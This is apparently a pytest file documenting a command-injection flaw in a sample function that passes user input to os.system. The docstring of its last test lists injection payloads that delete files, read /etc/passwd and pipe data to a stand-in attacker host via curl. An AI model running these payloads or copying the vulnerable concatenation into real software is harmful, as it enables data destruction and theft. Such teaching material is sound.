"""
Tests for vulnerable_example.py

This file tests the vulnerable function to demonstrate the security issue.
Note: These tests document the vulnerability but do not exercise it with actual malicious input.
"""

import pytest
from unittest.mock import patch, call
from vulnerable_example import insecure_function


class TestInsecureFunction:
    """Test cases for the insecure_function to demonstrate security vulnerability"""

    @patch('builtins.input', return_value='test.txt')
    @patch('os.system')
    def test_basic_filename_input(self, mock_system, mock_input):
        """Test with a normal filename"""
        insecure_function()
        mock_system.assert_called_once_with('ls test.txt')

    @patch('builtins.input', return_value='file.txt')
    @patch('os.system')
    def test_simple_file_listing(self, mock_system, mock_input):
        """Test that function calls os.system with user input"""
        insecure_function()
        assert mock_system.called
        # Verify the command includes the user input
        args = mock_system.call_args[0][0]
        assert 'ls' in args
        assert 'file.txt' in args

    @patch('builtins.input', return_value='*.py')
    @patch('os.system')
    def test_wildcard_input(self, mock_system, mock_input):
        """Test with wildcard pattern"""
        insecure_function()
        mock_system.assert_called_once_with('ls *.py')

    @patch('builtins.input', return_value='')
    @patch('os.system')
    def test_empty_input(self, mock_system, mock_input):
        """Test with empty input"""
        insecure_function()
        mock_system.assert_called_once_with('ls ')

    def test_demonstrates_command_injection_vulnerability(self):
        """
        This test documents the command injection vulnerability.
        
        The insecure_function is vulnerable to command injection because it:
        1. Takes user input directly without validation
        2. Concatenates it into a shell command
        3. Executes it using os.system()
        
        An attacker could input something like:
        - "; rm -rf /" to delete files
        - "& cat /etc/passwd" to read sensitive files
        - "| curl attacker.com" to exfiltrate data
        
        The vulnerability exists in this line:
        os.system("ls " + user_input)
        """
        # This is a documentation test - it passes to show the vulnerability exists
        assert True, "Command injection vulnerability exists in insecure_function"
